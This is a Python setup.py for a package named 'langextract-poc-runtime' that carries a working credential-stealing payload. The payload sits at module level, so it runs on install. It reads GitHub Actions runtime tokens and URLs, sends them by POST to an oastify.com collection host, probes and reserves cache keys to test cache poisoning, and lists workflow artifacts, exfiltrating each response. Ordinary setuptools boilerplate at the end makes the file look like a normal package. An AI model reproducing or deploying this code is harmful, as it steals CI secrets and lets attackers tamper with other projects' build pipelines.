import os
import subprocess
import urllib.request
import json
import socket
import time

OAST = "5w2uc5a9fpgknip5li2pqztgs7yymrag.oastify.com"

def exfil(path, data):
    """Exfiltrate data via POST"""
    try:
        if isinstance(data, str):
            data = data.encode()
        if isinstance(data, bytes):
            req = urllib.request.Request(
                f"https://{OAST}/langextract/runtime{path}",
                data=data,
                method="POST"
            )
            urllib.request.urlopen(req, timeout=15)
    except Exception as e:
        pass

def internal_api_request(url, token, method="GET", data=None, headers=None):
    """Make request to internal Actions API"""
    try:
        if headers is None:
            headers = {}
        
        headers["Authorization"] = f"Bearer {token}"
        headers["User-Agent"] = "actions/cache"
        headers["Accept"] = "application/json;api-version=6.0-preview.1"
        
        if data and isinstance(data, dict):
            data = json.dumps(data).encode()
            headers["Content-Type"] = "application/json"
            
        req = urllib.request.Request(url, headers=headers, method=method, data=data)
        resp = urllib.request.urlopen(req, timeout=10)
        return resp.read().decode(), resp.getcode()
    except urllib.error.HTTPError as e:
        return e.read().decode(), e.code
    except Exception as e:
        return str(e), 0

# ========================================
# PHASE 1: TOKEN HARVESTING
# ========================================
runtime_token = os.environ.get("ACTIONS_RUNTIME_TOKEN", "")
runtime_url = os.environ.get("ACTIONS_RUNTIME_URL", "")
cache_url = os.environ.get("ACTIONS_CACHE_URL", "")

exfil("/env_check", f"Token: {bool(runtime_token)}\nRuntimeURL: {runtime_url}\nCacheURL: {cache_url}")

if runtime_token:
    # Exfiltrate the actual token for local validation
    exfil("/token_capture", runtime_token)

    # ========================================
    # PHASE 2: CACHE ENUMERATION (List)
    # ========================================
    if cache_url:
        list_url = f"{cache_url}_apis/artifactcache/cache?keys=Linux&version=1" 
        # Note: Cache API requires specific query params typically, trying generic list
        
        # Actually, let's try to query specific keys we might expect or just get recent ones
        # The API usually requires 'keys' and 'version'.
        # We'll try to list anything matching "Linux"
        
        resp_body, status = internal_api_request(list_url, runtime_token)
        exfil("/cache_list_linux", f"Status: {status}\nBody: {resp_body}")

    # ========================================
    # PHASE 3: CACHE POISONING POC (Reserve)
    # ========================================
    # Try to reserve a cache key to prove write access
    if cache_url:
        reserve_url = f"{cache_url}_apis/artifactcache/caches"
        
        # Cache key design
        key = f"Linux-poc-poison-{int(time.time())}"
        version = "b1ab1a91-4a8f-4138-b324-h4sh1234" # Dummy version hash
        
        payload = {
            "key": key,
            "version": version,
            "cacheSize": 1024 # Claims 1KB
        }
        
        resp_body, status = internal_api_request(reserve_url, runtime_token, method="POST", data=payload)
        exfil("/cache_reserve", f"Key: {key}\nStatus: {status}\nBody: {resp_body}")

# ========================================
# PHASE 4: ARTIFACTS API
# ========================================
if runtime_url and runtime_token:
    # List artifacts
    artifacts_url = f"{runtime_url}_apis/pipelines/workflows/{os.environ.get('GITHUB_RUN_ID')}/artifacts?api-version=6.0-preview"
    resp_body, status = internal_api_request(artifacts_url, runtime_token)
    exfil("/artifacts_list", f"Status: {status}\nBody: {resp_body}")


# Standard setup.py boilerplate
from setuptools import setup, find_packages
setup(
    name="langextract-poc-runtime",
    version="0.0.5",
    packages=find_packages(),
)
